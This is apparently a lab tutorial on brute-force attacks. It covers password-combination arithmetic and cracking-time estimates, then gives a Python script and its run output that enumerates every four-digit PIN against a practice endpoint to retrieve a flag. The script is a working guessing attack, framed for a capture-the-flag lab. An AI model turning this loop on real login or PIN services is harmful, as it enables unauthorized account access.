# Brute Force Attacks

## Understanding the Mathematics

To grasp brute forcing, you need to understand the underlying mathematics. The formula for total possible password combinations is:

```
Possible Combinations = Character Set Size ^ Password Length
```

For example:
- A 6-character password with lowercase letters (26 characters) = 26^6 ≈ 300 million combinations
- An 8-character password with lowercase letters = 26^8 ≈ 200 billion combinations

Adding uppercase letters, numbers, and symbols expands the search space exponentially.

### Password Complexity Impact

| Scenario | Length | Character Set | Combinations |
|----------|--------|---------------|--------------|
| Simple | 6 | Lowercase (a-z) | 26^6 = 308.9M |
| Simple | 8 | Lowercase (a-z) | 26^8 = 208.8B |
| Medium | 8 | Lowercase + Uppercase | 52^8 = 53.4T |
| Complex | 12 | All ASCII characters | 94^12 = 475.9Q |

Even small increases in length or character types dramatically expand the search space, making brute-force attacks more time-consuming.

### Computational Power Matters

Cracking time depends on available computing power:

- **Basic Computer** (1M passwords/sec): 8-character alphanumeric password ≈ 6.92 years
- **Supercomputer** (1T passwords/sec): 12-character ASCII password ≈ 15,000 years

## Practical Example: Cracking a PIN

The target application generates a random 4-digit PIN at the `/pin` endpoint. A correct PIN returns a success message with a flag.

### PIN Solver Script

```python
import requests

ip = "127.0.0.1"  # Change to your instance IP
port = 1234       # Change to your instance port

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")
    
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Execution

```bash
alexsdb@htb[/htb]$ python pin-solver.py

Attempted PIN: 4039
...
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

The script iterates through all 10,000 possible 4-digit PINs, sending GET requests until the correct PIN is found.
